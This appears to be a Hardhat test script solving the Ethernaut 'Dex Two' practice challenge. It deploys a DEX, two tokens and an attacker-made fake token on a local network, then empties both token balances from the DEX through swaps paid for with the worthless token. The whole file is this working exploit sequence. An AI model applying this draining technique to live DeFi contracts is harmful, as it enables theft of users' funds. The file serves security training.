const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Dex Two', function () {
  let deployer, attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();
    const DexTwo = await ethers.getContractFactory('DexTwo', deployer);
    const SwappableToken = await ethers.getContractFactory('SwappableToken', deployer);
    const DexTwoSolution = await ethers.getContractFactory('DexTwoSolution', attacker);

    this.dexTwo = await DexTwo.deploy();
    this.dexTwoSolution = await DexTwoSolution.deploy(this.dexTwo.address, 'fake', 'fake', 1000000);
    this.token1 = await SwappableToken.deploy(this.dexTwo.address, 'token1', 'tk1', 110);
    this.token2 = await SwappableToken.deploy(this.dexTwo.address, 'token2', 'tk2', 110);
    await this.token1.transfer(attacker.address, 10);
    await this.token2.transfer(attacker.address, 10);
    await this.token1.transfer(this.dexTwo.address, 100);
    await this.token2.transfer(this.dexTwo.address, 100);
    await this.dexTwo.setTokens(this.token1.address, this.token2.address);

    expect(await this.token1.balanceOf(attacker.address)).to.be.eq(10);
    expect(await this.token1.balanceOf(this.dexTwo.address)).to.be.eq(100);
    expect(await this.token2.balanceOf(attacker.address)).to.be.eq(10);
    expect(await this.token2.balanceOf(this.dexTwo.address)).to.be.eq(100);
  });

  it('Drains Dex Two', async function () {
    await this.dexTwoSolution.approve2(attacker.address, this.dexTwo.address, 1000000);
    await this.dexTwoSolution.transfer(this.dexTwo.address, 1);
    await this.dexTwo
      .connect(attacker)
      .approve(this.dexTwo.address, await this.dexTwoSolution.balanceOf(attacker.address));

    const token1onDex = await this.dexTwo.balanceOf(this.token1.address, this.dexTwo.address);
    const priceForAllToken1 = await this.dexTwo.getSwapAmount(
      this.token1.address,
      this.dexTwoSolution.address,
      token1onDex
    );
    await this.dexTwo.connect(attacker).swap(this.dexTwoSolution.address, this.token1.address, priceForAllToken1);

    const token2onDex = await this.dexTwo.balanceOf(this.token2.address, this.dexTwo.address);
    const priceForAllToken2 = await this.dexTwo.getSwapAmount(
      this.token2.address,
      this.dexTwoSolution.address,
      token2onDex
    );
    await this.dexTwo.connect(attacker).swap(this.dexTwoSolution.address, this.token2.address, priceForAllToken2);

    expect(await this.dexTwo.balanceOf(this.token1.address, this.dexTwo.address)).to.be.eq(0);
    expect(await this.dexTwo.balanceOf(this.token2.address, this.dexTwo.address)).to.be.eq(0);
  });
});
